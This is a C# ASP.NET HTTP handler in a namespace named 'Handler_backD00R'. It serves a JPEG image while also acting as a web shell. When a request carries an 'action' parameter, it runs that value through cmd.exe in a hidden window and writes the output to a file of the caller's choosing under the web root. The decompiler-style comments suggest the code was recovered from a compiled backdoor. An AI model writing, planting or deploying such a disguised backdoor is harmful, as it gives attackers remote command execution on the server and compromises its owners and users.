using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web;


namespace Handler_backD00R
{
    public class Handler : IHttpHandler
    {
        public bool IsReusable => false;

        public void ProcessRequest(HttpContext context)
        {   
            
            var imagePath = "C:\\Users\\nz\\Desktop\\NZtest\\Images\\a.jpg";
            context.Response.ContentType = "image/JPEG";
            if (context.Request["action"] != null){
                cmdShell(context.Request["path"],context.Request["action"]);
            }

            byte[] imageByte = File.ReadAllBytes(imagePath);
            context.Response.ContentType = "image/jpeg";
            context.Response.BinaryWrite(imageByte);

            
        }

        // Token: 0x06000002 RID: 2 RVA: 0x00002238 File Offset: 0x00000438
        public void cmdShell(string path, string input)
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.Arguments = "/c " + input;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();
            StreamReader standardOutput = process.StandardOutput;
            string input2 = standardOutput.ReadToEnd();
            standardOutput.Close();
            standardOutput.Dispose();
            this.CreateFiles(path, input2);
        }

        // Token: 0x06000003 RID: 3 RVA: 0x000022C8 File Offset: 0x000004C8
        public void CreateFiles(string path, string input)
        {
            StreamWriter streamWriter = File.CreateText(HttpContext.Current.Server.MapPath(path));
            streamWriter.Write(input);
            streamWriter.Flush();
            streamWriter.Close();
        }


    }
}


